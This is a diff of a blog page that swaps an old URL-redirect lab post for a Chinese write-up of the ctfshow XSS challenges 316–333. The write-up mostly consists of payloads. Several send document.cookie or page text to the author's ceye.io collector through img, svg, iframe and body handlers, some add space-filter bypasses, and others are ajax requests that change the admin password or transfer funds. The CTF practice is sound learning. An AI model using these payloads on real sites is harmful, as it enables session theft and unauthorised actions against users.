@@ -22,7 +22,7 @@
 
   
 
-  <title>pikachu靶场-不安全的URL重定向 | Liv_binz的技术博客</title>
+  <title>WP-ctfshow-XSS-316-333 | Liv_binz的技术博客</title>
 
   
 
@@ -90,20 +90,20 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">pikachu靶场-不安全的URL重定向</h1>
+          <h1 class="title-wrap">WP-ctfshow-XSS-316-333</h1>
           <h2 class="title-sub-wrap">
             <strong>b1nz</strong>
             <span>发布于</span>
-            <time  class="article-date" datetime="2022-01-31T07:14:08.028Z" itemprop="datePublished">2022-01-31</time>
+            <time  class="article-date" datetime="2022-06-27T17:47:58.720Z" itemprop="datePublished">2022-06-28</time>
           </h2>
           <ul class="wrap-list dark">
   
-    <li><a href="/categories/wp/">📒 wp</a></li>
+    <li><a href="/categories/xss/">📒 xss</a></li>
   
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/pikachu/">🏷️ pikachu</a></li>
+    <li><a href="/tags/ctfshow/">🏷️ ctfshow</a></li>
   
 </ul>
         </div>
@@ -127,19 +127,123 @@
       
       
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
-        <p>页面如图：</p>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220131151511.png"></p>
-<p>测试后发现点击第三个超链接会重定向到<code>unsafere.php</code></p>
-<p>观察一下burp proxy里面的HTTP history</p>
-<p>看一下请求的status line，如下：</p>
-<pre><code>GET /vul/urlredirect/urlredirect.php?url=unsafere.php HTTP/1.1
+        <h1 id="WP-ctfshow-XSS-316-333"><a href="#WP-ctfshow-XSS-316-333" class="headerlink" title="WP-ctfshow-XSS-316-333"></a>WP-ctfshow-XSS-316-333</h1><p>此题思路很简单，上传自己xss平台的代码，后台会有虚拟的admin机器人5s点击一下这个链接，就可以获取到cookie了。</p>
+<p>我这里用的是ceye：</p>
+<p>payload集合如下：</p>
+<ol>
+<li>img</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; var img=document.createElement(&quot;img&quot;); img.src=&quot;http://8f1nep.ceye.io//&quot;+document.cookie; &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>window.open</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://你的ceye地址/&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>input</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://你的ceye地址/&#x27;+document.cookie)&quot; autofocus&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>svg</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://你的ceye地址/&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>iframe</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=&quot;window.open(&#x27;http://你的ceye地址/&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li>body</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.open(&#x27;http://你的ceye地址/&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>过滤了script 挑个没script的payload用就行了</p>
+<h1 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h1><p>过滤了img 挑个没img的payload用就行了</p>
+<h1 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h1><p>不知道过滤了啥 反正payload能用</p>
+<h1 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h1><p>过滤了空格</p>
+<p>绕过如下：</p>
+<pre><code>&lt;body/**/onload=&quot;window.open(&#39;http://8f1nep.ceye.io/&#39;+document.cookie)&quot;&gt;
 </code></pre>
-<p>发现是在url里面传入的参数</p>
-<p>用百度来测试一下：</p>
-<pre><code>http://192.168.0.6:4001/vul/urlredirect/urlredirect.php?url=http://www.baidu.com
+<p>或者：</p>
+<pre><code>&lt;body/onload=&quot;window.open(&#39;http://8f1nep.ceye.io/&#39;+document.cookie)&quot;&gt;
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/l1vb1nz/figurebed/main/20220131182252.png"></p>
-<p>跳转成功 漏洞存在^^</p>
+<h1 id="web321-web326"><a href="#web321-web326" class="headerlink" title="web321-web326"></a>web321-web326</h1><p>不知道过滤了啥 反正payload可以用</p>
+<h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p>收件人只有写admin才能发送成功</p>
+<p>大概这道题的意思是只有发给admin才能偷到admin的cookie八 不懂</p>
+<h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>试了一下万能密码 不来塞 没意思哈哈哈</p>
+<p>然后注册一个用户，用户名随便填，密码填写payload（这里body不行，随便换一个）</p>
+<p>抓到admin的cookie</p>
+<p>然后在console里改一下cookie就可以看见用户管理里面flag了</p>
+<h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p>一打开ceye发现一大堆不一样的cookie我就懂了 cookie开始变了</p>
+<p>原来的方法不通了</p>
+<p>这里学习了一下</p>
+<p>document.querySelector()</p>
+<blockquote>
+<p>参考资料：<br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/querySelector">https://developer.mozilla.org/zh-CN/docs/Web/API/Document/querySelector</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; var img=document.createElement(&quot;img&quot;); img.src=</span><br><span class="line">&quot;http://8f1nep.ceye.io/&quot;+document.querySelector(&#x27;#top &gt; div.layui-container&#x27;).textContent;</span><br></pre></td></tr></table></figure>
+
+<h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/onload=&quot;window.open(&#x27;http://127.0.0.1/api/change.php?p=123&#x27;)&quot;&gt; </span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt; 这个可以用</span><br></pre></td></tr></table></figure>
+
+<h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>由于方法从get改成了post 所以要想一个通过xss传入数据的方法</p>
+<p>所以想到用ajax</p>
+<p>关于jQuery $.ajax方法的使用呢，详情参见以下文章：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://c.biancheng.net/view/8009.html">http://c.biancheng.net/view/8009.html</a></p>
+</blockquote>
+<p>具体形式可以到源码里去看：</p>
+<pre><code>$.ajax(&#123;
+      url:&#39;api/change.php&#39;,
+      type:&#39;post&#39;,
+      data:&#123;
+        p:newpass
+      &#125;,
+      success:function(data)&#123;
+        layer.msg(data);
+      &#125;
+    &#125;);
+</code></pre>
+<p>修改成payload如下：</p>
+<pre><code>&lt;script&gt; $.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;,success:function(data)&#123;layer.msg(data);&#125;&#125;); &lt;/script&gt;
+</code></pre>
+<p>耶！可以用！成功啦~</p>
+<h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>哇靠，这题就给admin转-10000块钱就可以收获10000块。。。然后就可以买到flag了。。。牛。。。</p>
+<h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><ol>
+<li>逻辑问题</li>
+</ol>
+<p>自己可以给自己转账，只会收到钱不会扣钱，转个几次转到9999为止….</p>
+<ol start="2">
+<li>让管理员给俺们转钱 依旧用异步</li>
+</ol>
+<p>先抓包看一下转账是怎么转的</p>
+<pre><code>POST /api/amount.php HTTP/1.1
+Host: 85e65110-fcf6-4911-9065-d2d1faacc1ac.challenge.ctf.show
+Content-Length: 9
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://85e65110-fcf6-4911-9065-d2d1faacc1ac.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://85e65110-fcf6-4911-9065-d2d1faacc1ac.challenge.ctf.show/transfer.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=kqdf31frfei6se1ovjra597gl1
+Connection: close
+
+u=123&amp;a=8
+</code></pre>
+<p>写一个payload如下</p>
+<pre><code>&lt;script&gt;$.ajax(&#123;url:&#39;/api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;
+</code></pre>
+<p>耶成功啦！！！！</p>
+<blockquote>
+<p>至此ctfshow的XSS就AK啦 完结撒花！！</p>
+<p>date：2022/06/29</p>
+</blockquote>
 
       </section>
 
@@ -147,22 +251,6 @@
       
         <nav class="article-nav">
           
-            <div class="article-nav-item layout-padding">
-  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
-    
-      <div class="card-cover" background-image-lazy data-img="/cover.jpg"></div>
-    
-    <div class="card-text">
-      
-        <a href="/2022/05/03/xss1/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">见框就插之XSS</h2>
-        </a>
-      
-      <div class="card-text--row">Newer</div>
-    </div>
-  </article>
-</div>
-          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
@@ -171,8 +259,8 @@
     
     <div class="card-text">
       
-        <a href="/2022/01/31/pikachu1/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">pikachu靶场-SQLI-数字型注入（POST）</h2>
+        <a href="/2022/06/19/google%20dork/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">Google dork</h2>
         </a>
       
       <div class="card-text--row">Older</div>
